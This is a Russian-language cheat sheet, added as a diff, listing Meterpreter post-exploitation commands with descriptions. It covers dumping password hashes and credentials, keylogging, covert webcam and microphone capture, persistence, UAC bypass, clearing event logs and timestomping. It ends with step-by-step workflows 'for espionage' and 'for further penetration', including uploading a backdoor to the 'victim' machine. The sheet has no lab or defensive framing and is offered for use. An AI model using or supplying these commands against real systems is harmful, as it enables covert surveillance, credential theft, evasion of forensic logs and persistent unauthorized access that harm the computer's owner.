@@ -1,0 +1,114 @@
+📋 ПОЛНЫЙ СПИСОК КОМАНД METERPRETER С ОПИСАНИЕМ
+🎯 ИНФОРМАЦИЯ О СИСТЕМЕ
+bash
+sysinfo                    # Информация о системе (ОС, архитектура, имя)
+getuid                     # Текущий пользователь (кто мы в системе)
+getpid                     # ID нашего процесса
+ps                         # Список всех процессов
+kill <PID>                 # Убить процесс по ID
+getenv                     # Показать переменные окружения
+📁 РАБОТА С ФАЙЛАМИ
+bash
+pwd                        # Текущая директория
+ls                         # Список файлов в текущей папке
+cd <папка>                 # Перейти в папку
+dir                        # То же что ls
+cat <файл>                 # Показать содержимое файла
+edit <файл>                # Редактировать файл (откроет nano)
+download <файл>            # Скачать файл с Windows на Kali
+upload <файл> <путь>       # Загрузить файл с Kali на Windows
+mkdir <папка>              # Создать папку
+rm <файл>                  # Удалить файл
+rmdir <папка>              # Удалить папку
+search -f *.txt            # Поиск файлов по маске
+🖥️ СИСТЕМНЫЕ КОМАНДЫ
+bash
+shell                      # Открыть командную строку Windows (cmd)
+powershell_shell           # Открыть PowerShell
+execute -f cmd.exe -i      # Запустить программу
+getsystem                  # Попытаться получить права SYSTEM
+rev2self                   # Вернуться к исходному пользователю
+reg <команда>              # Работа с реестром
+shutdown                   # Выключить компьютер
+reboot                     # Перезагрузить компьютер
+🌐 СЕТЕВЫЕ КОМАНДЫ
+bash
+ipconfig                   # Сетевые настройки (IP, шлюз, DNS)
+route                      # Таблица маршрутизации
+portfwd                    # Проброс портов
+arp                        # ARP таблица
+netstat                    # Активные соединения
+📸 ШПИОНАЖ И МОНИТОРИНГ
+bash
+screenshot                 # Сделать скриншот экрана
+screenshare                # Просмотр экрана в реальном времени (VNC)
+record_mic                 # Запись с микрофона
+webcam_list                # Список веб-камер
+webcam_snap                # Сделать фото с веб-камеры
+webcam_stream              # Потоковое видео с веб-камеры
+keyscan_start              # Начать запись нажатий клавиш
+keyscan_dump               # Показать записанные нажатия
+keyscan_stop               # Остановить запись клавиш
+🔧 ПРОДВИНУТЫЕ КОМАНДЫ
+bash
+migrate <PID>              # Перейти в другой процесс
+run post/windows/gather/hashdump  # Вытащить хэши паролей
+run post/windows/gather/credential_collector  # Собрать пароли
+run post/windows/manage/enable_rdp  # Включить RDP (удаленный рабочий стол)
+run post/windows/manage/migrate     # Автоматическая миграция
+persistence                # Установить автозагрузку
+clearev                    # Очистить логи Windows
+timestomp                  # Изменить время файла
+🎮 УПРАВЛЕНИЕ СЕССИЯМИ
+bash
+background                 # Отправить сессию в фон (не закрывая)
+sessions                   # Показать все активные сессии
+sessions -i <номер>        # Переключиться на сессию
+rename_session <имя>       # Переименовать сессию
+exit                       # Закрыть сессию и выйти из meterpreter
+🛡️ КОМАНДЫ ДЛЯ ПОВЫШЕНИЯ ПРИВИЛЕГИЙ
+bash
+getprivs                   # Показать текущие привилегии
+getsystem                  # Попытка получить SYSTEM права
+bypassuac                  # Обход UAC (User Account Control)
+run post/windows/manage/enable_rdp  # Включить удаленный доступ
+run post/windows/gather/credential_collector  # Собрать учетные данные
+📱 АУДИО И ВИДЕО
+bash
+record_mic                 # Записать звук с микрофона
+webcam_list                # Показать доступные камеры
+webcam_snap                # Сделать фото
+webcam_stream              # Видеопоток с камеры
+play <файл.wav>            # Воспроизвести звук на компьютере жертвы
+🔐 ПАРОЛИ И ХЭШИ
+bash
+hashdump                   # Дамп хэшей паролей (SAM)
+run post/windows/gather/smart_hashdump  # Умный дамп хэшей
+run post/windows/gather/credentials/windows_autologin  # Автологин пароли
+⚙️ УТИЛИТЫ И УПРАВЛЕНИЕ
+bash
+idletime                   # Сколько времени компьютер бездействовал
+localtime                  # Локальное время на компьютере жертвы
+reboot                     # Перезагрузка
+shutdown                   # Выключение
+uictl enable keyboard      # Включить клавиатуру (если отключена)
+uictl disable keyboard     # Отключить клавиатуру
+🎯 ВАЖНЫЕ КОМАНДЫ ПОСЛЕ ПОДКЛЮЧЕНИЯ:
+Базовый набор:
+bash
+1. sysinfo                 # Что за система
+2. getuid                  # Под каким пользователем
+3. pwd                     # Где находимся
+4. ps                      # Какие процессы работают
+5. migrate <explorer_PID>  # Перейти в explorer.exe
+Для шпионажа:
+bash
+1. screenshot              # Скриншот
+2. keyscan_start           # Запись клавиш
+3. webcam_snap             # Фото с камеры
+4. record_mic              # Запись звука
+Для дальнейшего проникновения:
+bash
+1. run post/windows/gather/hashdump  # Получить пароли
+2. run post/windows/manage/enable_rdp  # Включить удаленный доступ
+3. upload backdoor.exe     # Загрузить еще один бэкдор
